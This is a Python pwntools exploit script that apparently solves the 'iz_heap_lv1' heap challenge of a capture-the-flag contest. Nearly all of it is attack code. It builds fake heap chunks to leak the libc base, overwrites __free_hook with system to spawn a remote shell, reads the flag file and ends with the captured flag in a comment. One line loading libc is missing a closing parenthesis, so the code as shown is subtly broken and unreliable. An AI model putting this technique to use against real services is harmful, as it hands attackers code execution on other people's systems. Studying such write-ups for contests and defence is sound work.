#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''

    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

context.arch = "amd64"
# context.log_level = 'debug'
execve_file = './iz_heap_lv1'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('165.22.110.249', 3333)
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so'

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def Edit(index, size, data):
    sh.sendlineafter('Choice: \n', '2')
    sh.sendlineafter('Enter index: ', str(index))
    sh.sendlineafter('Enter size: ', str(size))
    sh.sendafter('Enter data: ', data)

def Show(name):
    sh.sendlineafter('Choice: \n', '4')
    if(name):
        sh.sendlineafter('DO you want to edit: (Y/N)', 'Y')
        sh.sendafter('Input name: ', name)
    else:
        sh.sendlineafter('DO you want to edit: (Y/N)', 'N')


name_addr = 0x602100

sh.sendafter('Input name: ', p64(0))

Edit(0, 0x18, '\n')

layout = [
    p64(name_addr + 0x20), p64(0),
    p64(0), p64(0x91), 
    '\0' * 0x80,
    p64(0), p64(0x21), p64(0), p64(0),
    p64(0), p64(0x21), p64(0), p64(0),
]

for i in  range(8):
    Show(flat(layout))
    Edit(20, 0x28, '\n')

Show('b' * 0x28)
sh.recvuntil('b' * 0x28)
result = sh.recvline()[:-1]
main_arena_addr = u64(result.ljust(8, '\0')) - 0xe0
log.success('main_arena_addr: ' + hex(main_arena_addr))

libc_addr = main_arena_addr - 0x3ebc40
log.success('libc_addr: ' + hex(libc_addr))

layout = [
    p64(name_addr + 0x20), p64(0),
    p64(0), p64(0x21), p64(0), p64(0),
    p64(0), p64(0x21), p64(0), p64(0),
]

Edit(1, 0x58, '\n')

Show(flat(layout))
Edit(20, 0x28, '\n')

Show('b' * 0x20 + p64(libc_addr + libc.symbols['__free_hook']))
Edit(2, 0x18, '/bin/sh\0')
Edit(3, 0x18, p64(libc_addr + libc.symbols['system']))

sh.sendlineafter('Choice: \n', '2')
sh.sendlineafter('Enter index: ', str(2))

sh.sendline('cat /home/iz_heap_lv1/flag')

sh.interactive()
clear()

# ISITDTU{d800dab9684113a5d6c7d2c0381b48c1553068bc}
